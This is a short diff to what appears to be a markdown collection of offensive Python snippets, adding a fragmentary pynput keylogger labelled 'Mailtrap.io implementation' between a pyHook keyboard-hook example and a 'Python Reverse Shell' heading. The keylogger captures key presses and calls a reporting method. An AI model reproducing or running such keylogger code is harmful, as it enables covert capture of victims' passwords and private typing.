@@ -579,6 +579,18 @@ hooks_manager.HookKeyboard()
 pythoncom.PumpMessages()
 ```
 
+Mailtrap.io implementation:
+
+```python
+from pynput import keyboard
+from pynput.keyboard import Listener
+...
+keyboard_listener = keyboard.Listener(on_press=self.save_data)
+with keyboard_listener:
+    self.report()
+    keyboard_listener.join()
+```
+
 # Python Reverse Shell:
 
 ```python
